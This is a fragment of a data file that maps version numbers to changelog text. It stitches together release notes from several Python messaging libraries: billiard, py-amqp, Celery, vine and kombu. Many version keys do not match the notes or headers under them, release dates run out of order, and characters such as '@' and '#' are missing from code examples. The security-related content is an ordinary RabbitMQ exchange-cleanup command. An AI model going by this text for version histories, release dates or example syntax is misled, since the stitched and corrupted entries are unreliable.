Agejevas.\n\n", "2.7.3.23": "---------------------\n\n- Windows: Now catches SystemExit from setuptools while trying to build\n  the C extension (Issue 41).\n\n", "2.7.3.22": "---------------------\n\n- Pool: apply_async now supports a ``callbacks_propagate`` keyword\n  argument that can be a tuple of exceptions to propagate in callbacks.\n  (callback, errback, accept_callback, timeout_callback).\n\n- Errors are no longer logged for OK and recycle exit codes.\n\n    This would cause normal maxtasksperchild recycled process\n    to log an error.\n\n- Fixed Python 2.5 compatibility problem (Issue 33).\n\n- FreeBSD: Compilation now disables semaphores if Python was built\n  without it (Issue 40).\n\n    Contributed by William Grzybowski\n\n", "2.7.3.21": "---------------------\n\n- Fixed typo EX_REUSE -> EX_RECYCLE\n\n- Code now conforms to new pep8.py rules.\n\n", "2.7.3.20": "---------------------\n\n- Pool: Disable restart limit if maxR is not set.\n\n- Pool: Now uses os.kill instead of signal.signal.\n\n    Contributed by Lukasz Langa\n\n- Fixed name error in process.py\n\n- Pool: ApplyResult.get now properly raises exceptions.\n\n    Fix contributed by xentac.\n\n", "2.7.3.19": "---------------------\n\n- Fixes problem at shutdown when gc has collected symbols.\n\n- Pool now always uses _kill for Py2.5 compatibility on Windows (Issue 32).\n\n- Fixes Python 3 compatibility issues\n\n", "2.7.3.18": "---------------------\n\n- [Pool] Fix for check_timeouts if not set.\n\n    Fix contributed by Dmitry Sukhov\n\n- Fixed pickle problem with Traceback.\n\n    Code.frame.__loader__ is now ignored as it may be set to\n    an unpickleable object.\n\n- The Django old-layout warning was always showing.\n\n", "2.7.3.17": "---------------------\n\n- Fixes typo\n\n", "2.7.3.16": "---------------------\n\n- Windows: Fixes for SemLock._rebuild (Issue 24).\n\n- Pool: Job terminated with terminate_job now raises\n  billiard.exceptions.Terminated.\n\n", "2.7.3.15": "---------------------\n\n- Windows: Fixes unpickling of SemLock when using fallback.\n\n- Windows: Fixes installation when no C compiler.\n\n", "2.7.3.14": "---------------------\n\n- Installation now works again for Python 3.\n\n", "2.7.3.13": "---------------------\n\n- Merged with Python trunk (many authors, many fixes: see Python changelog in\n  trunk).\n\n- Using execv now also works with older Django projects using setup_environ\n  (Issue 10).\n\n- Billiard now installs with a warning that the C extension could not be built\n  if a compiler is not installed or the build fails in some other way.\n\n    It really is recommended to have the C extension installed when running\n    with force execv, but this change also makes it easier to install.\n\n- Pool: Hard timeouts now sends KILL shortly after TERM so that C extensions\n  cannot block the signal.\n\n    Python signal handlers are called in the interpreter, so they cannot\n    be called while a C extension is blocking the interpreter from running.\n\n- Now uses a timeout value for Thread.join that doesn't exceed the maximum\n  on some platforms.\n\n- Fixed bug in the SemLock fallback used when C extensions not installed.\n\n    Fix contributed by Mher Movsisyan.\n\n- Pool: Now sets a Process.index attribute for every process in the pool.\n\n    This number will always be between 0 and concurrency-1, and\n    can be used to e.g. create a logfile for each process in the pool\n    without creating a new logfile whenever a process is replaced.\n\n", "2.7.3.12": "---------------------\n\n- Fixed Python 2.5 compatibility issue.\n\n- New Pool.terminate_job(pid) to terminate a job without raising WorkerLostError\n\n", "2.7.3.11": "---------------------\n\n- Adds support for FreeBSD 7+\n\n    Fix contributed by koobs.\n\n- Pool: New argument ``allow_restart`` is now required to enable\n  the pool process sentinel that is required to restart the pool.\n\n    It's disabled by default, which reduces the number of file\n    descriptors/semaphores required to run the pool.\n\n- Pool: Now emits a warning if a worker process exited with error-code.\n\n    But not if the error code is 155, which is now returned if the worker\n    process was recycled (maxtasksperchild).\n\n- Python 3 compatibility fixes.\n\n- Python 2.5 compatibility fixes.\n\n", "2.7.3.10": "---------------------\n\n- The ``TimeLimitExceeded`` exception string representation\n  only included the seconds as a number, it now gives a more human\n  friendly description.\n\n- Fixed typo in ``LaxBoundedSemaphore.shrink``.\n\n- Pool: ``ResultHandler.handle_event`` no longer requires\n  any arguments.\n\n- setup.py bdist now works\n\n", "2.7.3.9": "--------------------\n\n- Environment variable ``MP_MAIN_FILE`` envvar is now set to\n  the path of the ``__main__`` module when execv is enabled.\n\n- Pool: Errors occurring in the TaskHandler are now reported.\n\n", "2.7.3.8": "--------------------\n\n- Can now be installed on Py 3.2\n\n- Issue 12091: simplify ApplyResult and MapResult with threading.Event\n\n  Patch by Charles-Francois Natali\n\n- Pool: Support running without TimeoutHandler thread.\n\n    - The with_*_thread arguments has also been replaced with\n      a single `threads=True` argument.\n\n    - Two new pool callbacks:\n\n        - ``on_timeout_set(job, soft, hard)``\n\n            Applied when a task is executed with a timeout.\n\n        - ``on_timeout_cancel(job)``\n\n            Applied when a timeout is cancelled (the job completed)\n\n", "2.7.3.7": "--------------------\n\n- Fixes Python 2.5 support.\n\n", "2.7.3.6": "--------------------\n\n- Pool: Can now be used in an event loop, without starting the supporting\n  threads (TimeoutHandler still not supported)\n\n    To facilitate this the pool has gained the following keyword arguments:\n\n        - ``with_task_thread``\n        - ``with_result_thread``\n        - ``with_supervisor_thread``\n        - ``on_process_up``\n\n            Callback called with Process instance as argument\n            whenever a new worker process is added.\n\n            Used to add new process fds to the eventloop::\n\n                def on_process_up(proc):\n                    hub.add_reader(proc.sentinel, pool.maintain_pool)\n\n        - ``on_process_down``\n\n            Callback called with Process instance as argument\n            whenever a new worker process is found dead.\n\n            Used to remove process fds from the eventloop::\n\n                def on_process_down(proc):\n                    hub.remove(proc.sentinel)\n\n        - ``semaphore``\n\n            Sets the semaphore used to protect from adding new items to the\n            pool when no processes available.  The default is a threaded\n            one, so this can be used to change to an async semaphore.\n\n    And the following attributes::\n\n        - ``readers``\n\n            A map of ``fd`` -> ``callback``, to be registered in an eventloop.\n            Currently this is only the result outqueue with a callback\n            that processes all currently incoming results.\n\n    And the following methods::\n\n        - ``did_start_ok``\n\n            To be called after starting the pool, and after setting up the\n            eventloop with the pool fds, to ensure that the worker processes\n            didn't immediately exit caused by an error (internal/memory).\n\n        - ``maintain_pool``\n\n            Public version of ``_maintain_pool`` that handles max restarts.\n\n- Pool: Process too frequent restart protection now only counts if the process\n  had a non-successful exit-code.\n\n    This to take into account the maxtasksperchild option, and allowing\n    processes to exit cleanly on their own.\n\n- Pool: New options max_restart + max_restart_freq\n\n    This means that the supervisor can't restart processes\n    faster than max_restart' times per max_restart_freq seconds\n    (like the Erlang supervisor maxR & maxT settings).\n\n    The pool is closed and joined if the max restart\n    frequency is exceeded, where previously it would keep restarting\n    at an unlimited rate, possibly crashing the system.\n\n    The current default value is to stop if it exceeds\n    100 * process_count restarts in 1 seconds.  This may change later.\n\n    It will only count processes with an unsuccessful exit code,\n    this is to take into account the ``maxtasksperchild`` setting\n    and code that voluntarily exits.\n\n- Pool: The ``WorkerLostError`` message now includes the exit-code of the\n  process that disappeared.\n\n\n", "2.7.3.5": "--------------------\n\n- Now always cleans up after ``sys.exc_info()`` to avoid\n  cyclic references.\n\n- ExceptionInfo without arguments now defaults to ``sys.exc_info``.\n\n- Forking can now be disabled using the\n  ``MULTIPROCESSING_FORKING_DISABLE`` environment variable.\n\n    Also this envvar is set so that the behavior is inherited\n    after execv.\n\n- The semaphore cleanup process started when execv is used\n  now sets a useful process name if the ``setproctitle``\n  module is installed.\n\n- Sets the ``FORKED_BY_MULTIPROCESSING``\n  environment variable if forking is disabled.\n\n\n", "2.7.3.4": "--------------------\n\n- Added `billiard.ensure_multiprocessing()`\n\n    Raises NotImplementedError if the platform does not support\n    multiprocessing (e.g. Jython).\n\n\n", "2.7.3.3": "--------------------\n\n- PyPy now falls back to using its internal _multiprocessing module,\n  so everything works except for forking_enable(False) (which\n  silently degrades).\n\n- Fixed Python 2.5 compat. issues.\n\n- Uses more with statements\n\n- Merged some of the changes from the Python 3 branch.\n\n", "2.7.3.2": "--------------------\n\n- Now installs on PyPy/Jython (but does not work).\n\n", "2.7.3.1": "--------------------\n\n- Python 2.5 support added.\n\n", "2.7.3.0": "--------------------\n\n- Updated from Python 2.7.3\n\n- Python 2.4 support removed, now only supports 2.5, 2.6 and 2.7.\n  (may consider py3k support at some point).\n\n- Pool improvements from Celery.\n\n- no-execv patch added (https://bugs.python.org/issue8713)\n\n\nChanges\n=======\n\npy-amqp is fork of amqplib used by Kombu containing additional features and improvements.\nThe previous amqplib changelog is here:\nhttp://code.google.com/p/py-amqplib/source/browse/CHANGES\n\n\n.. _version-5.2.0:\n\n", "5.2.0": "=====\n\n:release-date: 2021-11-08 7.15 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Prevent from subscribing to empty channels (7040)\n- fix register_task method.\n- Fire task failure signal on final reject (6980)\n- Limit pymongo version: <3.12.1 (7041)\n- Bump min kombu version to 5.2.1\n\n.. _version-5.2.0rc2:\n\n", "5.1.1": "=====\n:release-date: 2022-04-17 12:45 P.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Use AF_UNSPEC for name resolution (389).\n\n\n.. _version-5.1.0:\n\n", "5.1.0": "=====\n:release-date: 2023-11-05 2:45 P.M UTC+6:00\n:release-by: ASIF SAIF UDDIN\n\n- Dropped Python 3.6 support.\n- Added new Python versions support.\n- Dropped old dependencies.\n- Added new GHA based CI.\n- Added slots support and impproved dynamic assignment.\n\n\n  Contributed by **Asif Saif Uddin**\n\n\n.. _version-5.0.0:\n\n", "5.0.9": "=====\n:release-date: 2021-12-20 11:00 A.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Append to _used_channel_ids in _used_channel_ids\n\n\n.. _version-5.0.8:\n\n", "5.0.8": "=====\n:release-date: 2021-12-19 11:15 A.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Reduce memory usage of Connection (377)\n- Add additional error handling around code where an OSError\n  may be raised on failed connections. Fixes (378)\n\n\n.. _version-5.0.7:\n\n", "5.0.7": "=====\n:release-date: 2021-12-13 15:45 P.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Remove dependency to case\n- Bugfix: not closing socket after server disconnect\n\n\n.. _version-5.0.6:\n\n", "5.0.6": "=====\n:release-date: 2021-04-01 10:45 A.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Change the order in which context.check_hostname and context.verify_mode get set\n  in SSLTransport._wrap_socket_sni. Fixes bug introduced in 5.0.3 where setting\n  context.verify_mode = ssl.CERT_NONE would raise\n  \"ValueError: Cannot set verify_mode to CERT_NONE when check_hostname is enabled.\"\n  Setting context.check_hostname prior to setting context.verify_mode resolves the\n  issue.\n- Remove TCP_USER_TIMEOUT option for Solaris (355)\n- Pass long_description to setup() (353)\n- Fix for tox-docker 2.0\n- Moved to GitHub actions CI (359)\n\n.. _version-5.0.5:\n\n", "5.0.5": "=====\n:release-date: 2021-01-28 4:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n-  Removed mistakenly introduced code which was causing import errors\n\n\n\n.. _version-5.0.4:\n\n", "5.0.4": "=====\n:release-date: 2021-01-28 2:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n-  Add missing load_default_certs() call to fix a regression in v5.0.3 release. (350)\n\n\n.. _version-5.0.3:\n\n", "5.0.3": "=====\n:release-date: 2021-01-19 9:00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Change the default value of ssl_version to None. When not set, the\n  proper value between ssl.PROTOCOL_TLS_CLIENT and ssl.PROTOCOL_TLS_SERVER\n  will be selected based on the param server_side in order to create\n  a TLS Context object with better defaults that fit the desired\n  connection side.\n\n- Change the default value of cert_reqs to None. The default value\n  of ctx.verify_mode is ssl.CERT_NONE, but when ssl.PROTOCOL_TLS_CLIENT\n  is used, ctx.verify_mode defaults to ssl.CERT_REQUIRED.\n\n- Fix context.check_hostname logic. Checking the hostname depends on\n  having support of the SNI TLS extension and being provided with a\n  server_hostname value. Another important thing to mention is that\n  enabling hostname checking automatically sets verify_mode from\n  ssl.CERT_NONE to ssl.CERT_REQUIRED in the stdlib ssl and it cannot\n  be set back to ssl.CERT_NONE as long as hostname checking is enabled.\n\n- Refactor the SNI tests to test one thing at a time and removing some\n  tests that were being repeated over and over.\n\n\n\n.. _version-5.0.2:\n\n", "5.0.2": "=====\n:release-date: 2020-09-06 6:30 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Bump required amqp version to 5.0.0.\n\n.. _version-5.0.1:\n\n", "5.0.1": "=====\n:release-date: 2020-08-23 19:10 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Removed kombu.five from the reference documentation since it no longer exists\n- Adjusted the stable documentation's version in Sphinx's configuration since that was overlooked in the latest release\n\n.. _version-5.0.0:\n\n", "5.0.0": "=====\n:release-date: 2020-09-06 6:10 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Dropped Python 3.5 support.\n\n  Contributed by **Omer Katz**\n\n.. _version-5.0.0a1:\n\n", "5.0.0b1": "=======\n:release-date: 2020-09-01 6:20 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Dropped Python 3.5 support.\n\n  Contributed by **Omer Katz**\n\n- Removed additional compatibility code.\n\n  Contributed by **Omer Katz**\n\n.. _version-5.0.0a1:\n\n", "5.0.0a1": "=======\n:release-date: 2019-04-01 4:30 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Dropped Python 2.x support.\n\n  Contributed by **Omer Katz**\n\n- Dropped Python 3.4 support.\n\n  Contributed by **Omer Katz**\n\n- Removed the :mod:`vine.five` module.\n\n  Contributed by **Omer Katz**\n\n- Removed the :mod:`vine.backports.weakref_backports` module.\n\n  Contributed by **Omer Katz**\n\n.. _version-1.3.0:\n\n", "2.6.1": "=====\n:release-date: 2020-07-31 10.30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix buffer overflow in frame_writer after frame_max is increased. `frame_writer`\nallocates a `bytearray` on initialization with a length based on the `connection.frame_max`\nvalue. If `connection.frame_max` is changed to a larger value, this causes an\nerror like `pack_into requires a buffer of at least 408736 bytes`.\n\n\n.. _version-2.6.0:\n\n", "2.6.0": "=====\n:release-date: 20-06-01 12.00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Implement speedups in cython (311)\n- Updated some tests & code improvements\n- Separate logger for Connection.heartbeat_tick method\n- Cython generic content (315)\n- Improve documentation a_global parameter of basic_qos() method.\n- Fix saving partial read buffer on windows during socket timeout. (321)\n- Fix deserialization of long string field values that are not utf-8.\n- Added simple cythonization of abstract_channel.py\n- Speedups of serialization.py are more restrictive\n\n.. _version-2.5.2:\n\n", "2.5.2": "=====\n:release-date: 2012-11-29 12:35 P.M UTC\n:release-by: Ask Solem\n\n- [Redis] Fixed connection leak and added a new 'max_connections' transport\n  option.\n\n.. _version-2.5.1:\n\n", "2.5.1": "=====\n:release-date: 2012-11-28 12:45 P.M UTC\n:release-by: Ask Solem\n\n- Fixed bug where return value of Queue.as_dict could not be serialized with\n  JSON (Issue 177).\n\n.. _version-2.5.0:\n\n", "2.5.0": "=====\n:release-date: 2012-11-27 04:00 P.M UTC\n:release-by: Ask Solem\n\n- `py-amqp`_ is now the new default transport, replacing ``amqplib``.\n\n    The new `py-amqp`_ library is a fork of amqplib started with the\n    following goals:\n\n        - Uses AMQP 0.9.1 instead of 0.8\n        - Support for heartbeats (Issue 79 + Issue 131)\n        - Automatically revives channels on channel errors.\n        - Support for all RabbitMQ extensions\n            - Consumer Cancel Notifications (Issue 131)\n            - Publisher Confirms (Issue 131).\n            - Exchange-to-exchange bindings: ``exchange_bind`` / ``exchange_unbind``.\n        - API compatible with :mod:`librabbitmq` so that it can be used\n          as a pure-python replacement in environments where rabbitmq-c cannot\n          be compiled.  librabbitmq will be updated to support all the same\n          features as py-amqp.\n\n- Support for using multiple connection URL's for failover.\n\n    The first argument to :class:`~kombu.Connection` can now be a list of\n    connection URLs:\n\n    .. code-block:: python\n\n        Connection(['amqp://foo', 'amqp://bar'])\n\n    or it can be a single string argument with several URLs separated by\n    semicolon:\n\n    .. code-block:: python\n\n        Connection('amqp://foo;amqp://bar')\n\n    There is also a new keyword argument ``failover_strategy`` that defines\n    how :meth:`~kombu.Connection.ensure_connection`/\n    :meth:`~kombu.Connection.ensure`/:meth:`kombu.Connection.autoretry` will\n    reconnect in the event of connection failures.\n\n    The default reconnection strategy is ``round-robin``, which will simply\n    cycle through the list forever, and there's also a ``shuffle`` strategy\n    that will select random hosts from the list.  Custom strategies can also\n    be used, in that case the argument must be a generator yielding the URL\n    to connect to.\n\n    Example:\n\n    .. code-block:: python\n\n        Connection('amqp://foo;amqp://bar')\n\n- Now supports PyDev, PyCharm, pylint and other static code analysis tools.\n\n- :class:`~kombu.Queue` now supports multiple bindings.\n\n    You can now have multiple bindings in the same queue by having\n    the second argument be a list:\n\n    .. code-block:: python\n\n        from kombu import binding, Queue\n\n        Queue('name', [\n            binding(Exchange('E1'), routing_key='foo'),\n            binding(Exchange('E1'), routing_key='bar'),\n            binding(Exchange('E2'), routing_key='baz'),\n        ])\n\n    To enable this, helper methods have been added:\n\n        - :meth:`~kombu.Queue.bind_to`\n        - :meth:`~kombu.Queue.unbind_from`\n\n    Contributed by Rumyana Neykova.\n\n- Custom serializers can now be registered using Setuptools entry-points.\n\n    See :ref:`serialization-entrypoints`.\n\n- New :class:`kombu.common.QoS` class used as a thread-safe way to manage\n  changes to a consumer or channels prefetch_count.\n\n    This was previously an internal class used in Celery now moved to\n    the :mod:`kombu.common` module.\n\n- Consumer now supports a ``on_message`` callback that can be used to process\n  raw messages (not decoded).\n\n    Other callbacks specified using the ``callbacks`` argument, and\n    the ``receive`` method will be not be called when a on message callback\n    is present.\n\n- New utility :func:`kombu.common.ignore_errors` ignores connection and\n  channel errors.\n\n    Must only be used for cleanup actions at shutdown or on connection loss.\n\n- Support for exchange-to-exchange bindings.\n\n    The :class:`~kombu.Exchange` entity gained ``bind_to``\n    and ``unbind_from`` methods:\n\n    .. code-block:: python\n\n        e1 = Exchange('A')(connection)\n        e2 = Exchange('B')(connection)\n\n        e2.bind_to(e1, routing_key='rkey', arguments=None)\n        e2.unbind_from(e1, routing_key='rkey', arguments=None)\n\n    This is currently only supported by the ``pyamqp`` transport.\n\n    Contributed by Rumyana Neykova.\n\n.. _version-2.4.10:\n\n", "2.4.2": "=====\n:release-date: 2012-08-24 05:00 P.M BST\n:release-by: Ask Solem\n\n- Having an empty transport name broke in 2.4.1.\n\n\n.. _version-2.4.1:\n\n", "2.4.1": "=====\n:release-date: 2012-08-24 04:00 P.M BST\n:release-by: Ask Solem\n\n- Redis: Fixed race condition that could cause the consumer to crash (Issue 151)\n\n    Often leading to the error message ``\"could not convert string to float\"``\n\n- Connection retry could cause an inifite loop (Issue 145).\n\n- The ``amqp`` alias is now resolved at runtime, so that eventlet detection\n  works even if patching was done later.\n\n.. _version-2.4.0:\n\n", "2.4.0": "=====\n:release-date: 2012-08-17 08:00 P.M BST\n:release-by: Ask Solem\n\n- New experimental :mod:`ZeroMQ <kombu.transport.zmq` transport.\n\n    Contributed by John Watson.\n\n- Redis: Ack timed-out messages were not restored when using the eventloop.\n\n- Now uses pickle protocol 2 by default to be cross-compatible with Python 3.\n\n    The protocol can also now be changed using the :envvar:`PICKLE_PROTOCOL`\n    environment variable.\n\n- Adds ``Transport.supports_ev`` attribute.\n\n- Pika: Queue purge was not working properly.\n\n    Fix contributed by Steeve Morin.\n\n- Pika backend was no longer working since Kombu 2.3\n\n    Fix contributed by Steeve Morin.\n\n.. _version-2.3.2:\n\n", "2.3.2": "=====\n:release-date: 2012-08-01 06:00 P.M BST\n:release-by: Ask Solem\n\n- Fixes problem with deserialization in Python 3.\n\n.. _version-2.3.1:\n\n", "2.3.1": "=====\n:release-date: 2012-08-01 04:00 P.M BST\n:release-by: Ask Solem\n\n- librabbitmq: Can now handle messages that does not have a\n  content_encoding/content_type set (Issue 149).\n\n    Fix contributed by C Anthony Risinger.\n\n- Beanstalk: Now uses localhost by default if the URL does not contain a host.\n\n.. _version-2.3.0:\n\n", "2.3.0": "=====\n:release-date: 2012-07-24 03:50 P.M BST\n:release-by: Ask Solem\n\n- New ``pyamqp://`` transport!\n\n    The new `py-amqp`_ library is a fork of amqplib started with the\n    following goals:\n\n        - Uses AMQP 0.9.1 instead of 0.8\n        - Should support all RabbitMQ extensions\n        - API compatible with :mod:`librabbitmq` so that it can be used\n          as a pure-python replacement in environments where rabbitmq-c cannot\n          be compiled.\n\n    .. _`py-amqp`: https://amqp.readthedocs.io/\n\n    If you start using use py-amqp instead of amqplib you can enjoy many\n    advantages including:\n\n        - Heartbeat support (Issue 79 + Issue 131)\n        - Consumer Cancel Notifications (Issue 131)\n        - Publisher Confirms\n\n    amqplib has not been updated in a long while, so maintaining our own fork\n    ensures that we can quickly roll out new features and fixes without\n    resorting to monkey patching.\n\n    To use the py-amqp transport you must install the :mod:`amqp` library:\n\n    .. code-block:: console\n\n        $ pip install amqp\n\n    and change the connection URL to use the correct transport:\n\n    .. code-block:: pycon\n\n        >>> conn = Connection('pyamqp://guest:guestlocalhost//')\n\n\n    The ``pyamqp://`` transport will be the default fallback transport\n    in Kombu version 3.0, when :mod:`librabbitmq` is not installed,\n    and librabbitmq will also be updated to support the same features.\n\n- Connection now supports heartbeat argument.\n\n    If enabled you must make sure to manually maintain heartbeats\n    by calling the ``Connection.heartbeat_check`` at twice the rate\n    of the specified heartbeat interval.\n\n    E.g. if you have ``Connection(heartbeat=10)``,\n    then you must call ``Connection.heartbeat_check()`` every 5 seconds.\n\n    if the server has not sent heartbeats at a suitable rate then\n    the heartbeat check method must raise an error that is listed\n    in ``Connection.connection_errors``.\n\n    The attribute ``Connection.supports_heartbeats`` has been added\n    for the ability to inspect if a transport supports heartbeats\n    or not.\n\n    Calling ``heartbeat_check`` on a transport that does\n    not support heartbeats results in a noop operation.\n\n- SQS: Fixed bug with invalid characters in queue names.\n\n    Fix contributed by Zach Smith.\n\n- utils.reprcall: Fixed typo where kwargs argument was an empty tuple by\n  default, and not an empty dict.\n\n.. _version-2.2.6:\n\n", "2.2.2": "=====\n:release-date: 2012-06-22 02:30 P.M BST\n:release-by: Ask Solem\n\n- Now depends on :mod:`anyjson` 0.3.3\n\n- Json serializer: Now passes :class:`buffer` objects directly,\n  since this is supported in the latest :mod:`anyjson` version.\n\n- Fixes blocking epoll call if timeout was set to 0.\n\n    Fix contributed by John Watson.\n\n- setup.py now takes requirements from the :file:`requirements/` directory.\n\n- The distribution directory :file:`contrib/` is now renamed to :file:`extra/`\n\n.. _version-2.2.1:\n\n", "2.2.1": "=====\n:release-date: 2012-06-21 01:00 P.M BST\n:release-by: Ask Solem\n\n- SQS: Default visibility timeout is now 30 minutes.\n\n    Since we have ack emulation the visibility timeout is\n    only in effect if the consumer is abrubtly terminated.\n\n- retry argument to ``Producer.publish`` now works properly,\n  when the declare argument is specified.\n\n- Json serializer: didn't handle buffer objects (Issue 135).\n\n    Fix contributed by Jens Hoffrichter.\n\n- Virtual: Now supports passive argument to ``exchange_declare``.\n\n- Exchange & Queue can now be bound to connections (which will use the default\n  channel):\n\n    .. code-block:: pycon\n\n        >>> exchange = Exchange('name')\n        >>> bound_exchange = exchange(connection)\n        >>> bound_exchange.declare()\n\n- ``SimpleQueue`` & ``SimpleBuffer`` can now be bound to connections (which\n  will use the default channel).\n\n- ``Connection.manager.get_bindings`` now works for librabbitmq and pika.\n\n- Adds new transport info attributes:\n\n    - ``Transport.driver_type``\n\n        Type of underlying driver, e.g. \"amqp\", \"redis\", \"sql\".\n\n    - ``Transport.driver_name``\n\n        Name of library used e.g. \"amqplib\", \"redis\", \"pymongo\".\n\n    - ``Transport.driver_version()``\n\n        Version of underlying library.\n\n.. _version-2.2.0:\n\n", "2.2.0": "=====\n:release-date: 2012-06-07 03:10 P.M BST\n:release-by: Ask Solem\n\n.. _v220-important:\n\nImportant Notes\n---------------\n\n- The canonical source code repository has been moved to\n\n    http://github.com/celery/kombu\n\n- Pidbox: Exchanges used by pidbox are no longer auto_delete.\n\n    Auto delete has been described as a misfeature,\n    and therefore we have disabled it.\n\n    For RabbitMQ users old exchanges used by pidbox must be removed,\n    these are named ``mailbox_name.pidbox``,\n    and ``reply.mailbox_name.pidbox``.\n\n    The following command can be used to clean up these exchanges:\n\n    .. code-block:: text\n\n        $ VHOST=/ URL=amqp:// python -c'import sys,kombu;[kombu.Connection(\n            sys.argv[-1]).channel().exchange_delete(x)\n                for x in sys.argv[1:-1]]' \\\n            $(sudo rabbitmqctl -q list_exchanges -p \"$VHOST\" \\\n            | grep \\.pidbox | awk '{print $1}') \"$URL\"\n\n    The :envvar:`VHOST` variable must be set to the target RabbitMQ virtual host,\n    and the :envvar:`URL` must be the AMQP URL to the server.\n\n- The ``amqp`` transport alias will now use :mod:`librabbitmq`\n  if installed.\n\n    `py-librabbitmq`_ is a fast AMQP client for Python\n    using the librabbitmq C library.\n\n    It can be installed by:\n\n    .. code-block:: console\n\n        $ pip install librabbitmq\n\n    It will not be used if the process is monkey patched by eventlet/gevent.\n\n.. _`py-librabbitmq`: https://github.com/celery/librabbitmq\n\n.. _v220-news:\n\nNews\n----\n\n- Redis: Ack emulation improvements.\n\n    Reducing the possibility of data loss.\n\n    Acks are now implemented by storing a copy of the message when the message\n    is consumed.  The copy is not removed until the consumer acknowledges\n    or rejects it.\n\n    This means that unacknowledged messages will be redelivered either\n    when the connection is closed, or when the visibility timeout is exceeded.\n\n    - Visibility timeout\n\n        This is a timeout for acks, so that if the consumer\n        does not ack the message within this time limit, the message\n        is redelivered to another consumer.\n\n        The timeout is set to one hour by default, but\n        can be changed by configuring a transport option:\n\n            >>> Connection('redis://', transport_options={\n            ...     'visibility_timeout': 1800,   30 minutes\n            ... })\n\n    **NOTE**: Messages that have not been acked will be redelivered\n    if the visibility timeout is exceeded, for Celery users\n    this means that ETA/countdown tasks that are scheduled to execute\n    with a time that exceeds the visibility timeout will be executed\n    twice (or more).  If you plan on using long ETA/countdowns you\n    should tweak the visibility timeout accordingly:\n\n    .. code-block:: python\n\n        BROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 18000}   5 hours\n\n    Setting a long timeout means that it will take a long time\n    for messages to be redelivered in the event of a power failure,\n    but if so happens you could temporarily set the visibility timeout lower\n    to flush out messages when you start up the systems again.\n\n- Experimental `Apache ZooKeeper`_ transport\n\n    More information is in the module reference:\n    :mod:`kombu.transport.zookeeper`.\n\n    Contributed by Mahendra M.\n\n.. _`Apache ZooKeeper`: http://zookeeper.apache.org/\n\n- Redis: Priority support.\n\n    The message's ``priority`` field is now respected by the Redis\n    transport by having multiple lists for each named queue.\n    The queues are then consumed by in order of priority.\n\n    The priority field is a number in the range of 0 - 9, where\n    0 is the default and highest priority.\n\n    The priority range is collapsed into four steps by default, since it is\n    unlikely that nine steps will yield more benefit than using four steps.\n    The number of steps can be configured by setting the ``priority_steps``\n    transport option, which must be a list of numbers in **sorted order**:\n\n    .. code-block:: pycon\n\n        >>> x = Connection('redis://', transport_options={\n        ...     'priority_steps': [0, 2, 4, 6, 8, 9],\n        ... })\n\n    Priorities implemented in this way is not as reliable as\n    priorities on the server side, which is why\n    nickname the feature \"quasi-priorities\";\n    **Using routing is still the suggested way of ensuring\n    quality of service**, as client implemented priorities\n    fall short in a number of ways, e.g. if the worker\n    is busy with long running tasks, has prefetched many messages,\n    or the queues are congested.\n\n    Still, it is possible that using priorities in combination\n    with routing can be more beneficial than using routing\n    or priorities alone.  Experimentation and monitoring\n    should be used to prove this.\n\n    Contributed by Germ\u00e1n M. Bravo.\n\n- Redis: Now cycles queues so that consuming is fair.\n\n    This ensures that a very busy queue won't block messages\n    from other queues, and ensures that all queues have\n    an equal chance of being consumed from.\n\n    This used to be the case before, but the behavior was\n    accidentally changed while switching to using blocking pop.\n\n- Redis: Auto delete queues that are bound to fanout exchanges\n  is now deleted at channel.close.\n\n- amqplib: Refactored the drain_events implementation.\n\n- Pidbox: Now uses ``connection.default_channel``.\n\n- Pickle serialization: Can now decode buffer objects.\n\n- Exchange/Queue declarations can now be cached even if\n  the entity is non-durable.\n\n    This is possible because the list of cached declarations\n    are now kept with the connection, so that the entities\n    will be redeclared if the connection is lost.\n\n- Kombu source code now only uses one-level of explicit relative imports.\n\n.. _v220-fixes:\n\nFixes\n-----\n\n- eventio: Now ignores ENOENT raised by ``epoll.register``, and\n  EEXIST from ``epoll.unregister``.\n\n- eventio: kqueue now ignores :exc:`KeyError` on unregister.\n\n- Redis: ``Message.reject`` now supports the ``requeue`` argument.\n\n- Redis: Remove superfluous pipeline call.\n\n    Fix contributed by Thomas Johansson.\n\n- Redis: Now sets redelivered header for redelivered messages.\n\n- Now always makes sure references to :func:`sys.exc_info` is removed.\n\n- Virtual: The compression header is now removed before restoring messages.\n\n- More tests for the SQLAlchemy backend.\n\n    Contributed by Franck Cuny.\n\n- Url parsing did not handle MongoDB URLs properly.\n\n    Fix contributed by Flavio Percoco Premoli.\n\n- Beanstalk: Ignore default tube when reserving.\n\n    Fix contributed by Zhao Xiaohong.\n\nNonblocking consume support\n---------------------------\n\nlibrabbitmq, amqplib and redis transports can now be used\nnon-blocking.\n\nThe interface is very manual, and only consuming messages\nis non-blocking so far.\n\nThe API should not be regarded as stable or final\nin any way. It is used by Celery which has very limited\nneeds at this point. Hopefully we can introduce a proper\ncallback-based API later.\n\n- ``Transport.eventmap``\n\n    Is a map of ``fd -> callback(fileno, event)``\n    to register in an eventloop.\n\n- ``Transport.on_poll_start()``\n\n    Is called before every call to poll.\n    The poller must support ``register(fd, callback)``\n    and ``unregister(fd)`` methods.\n\n- ``Transport.on_poll_start(poller)``\n\n    Called when the hub is initialized.\n    The poller argument must support the same\n    interface as :class:`kombu.utils.eventio.poll`.\n\n- ``Connection.ensure_connection`` now takes a callback\n  argument which is called for every loop while\n  the connection is down.\n\n- Adds ``connection.drain_nowait``\n\n    This is a non-blocking alternative to drain_events,\n    but only supported by amqplib/librabbitmq.\n\n- drain_events now sets ``connection.more_to_read`` if\n  there is more data to 